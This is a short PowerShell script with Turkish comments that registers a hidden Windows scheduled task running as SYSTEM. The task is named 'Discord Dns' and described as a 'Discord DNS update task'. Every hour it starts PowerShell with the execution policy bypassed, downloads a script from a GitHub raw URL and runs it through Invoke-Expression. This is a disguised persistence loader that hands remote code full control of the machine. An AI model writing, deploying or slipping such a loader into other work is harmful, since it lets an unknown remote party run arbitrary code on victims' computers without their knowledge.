$TaskService = New-Object -ComObject 'Schedule.Service'
$TaskService.Connect()
$RootFolder = $TaskService.GetFolder('\Siri')
$TaskDefinition = $TaskService.NewTask(0)

$TaskDefinition.RegistrationInfo.Description = 'Discord DNS update task'
$TaskDefinition.Principal.UserId = 'SYSTEM'
$TaskDefinition.Principal.LogonType = 3
$TaskDefinition.Principal.RunLevel = 1

# Trigger oluşturma
$Trigger = $TaskDefinition.Triggers.Create(3) # 3 = Daily
$Trigger.StartBoundary = (Get-Date).ToUniversalTime().AddMinutes(1).ToString('yyyy-MM-ddTHH:mm:ssZ') # UTC saatine göre başlangıç zamanı
$Trigger.Repetition.Interval = 'PT1H' # 1 saat aralıklarla tekrarlama
$Trigger.Repetition.Duration = 'P1D' # 1 gün boyunca tekrar edecek

# Günlük tetikleyici olarak gün ayarlarını yapılandırma
$Trigger.DaysOfWeek = 127 # 127 = tüm günler (Pazartesi - Pazar)

$Action = $TaskDefinition.Actions.Create(0)
$Action.Path = 'PowerShell.exe'
$Action.Arguments = '-ExecutionPolicy Bypass -Command ""& { Invoke-RestMethod -Uri ''https://raw.githubusercontent.com/SirriusV1/Oyun-Cfg/main/updated/discord.ps1'' | Invoke-Expression }""'

$TaskDefinition.Settings.Hidden = $true
$TaskDefinition.Settings.AllowDemandStart = $true # Talep üzerine başlatma izni
$TaskDefinition.Settings.StartWhenAvailable = $true # Uygun olduğunda başlat

# Görevi kaydetme
$RootFolder.RegisterTaskDefinition('Discord Dns', $TaskDefinition, 6, $null, $null, 3, $null)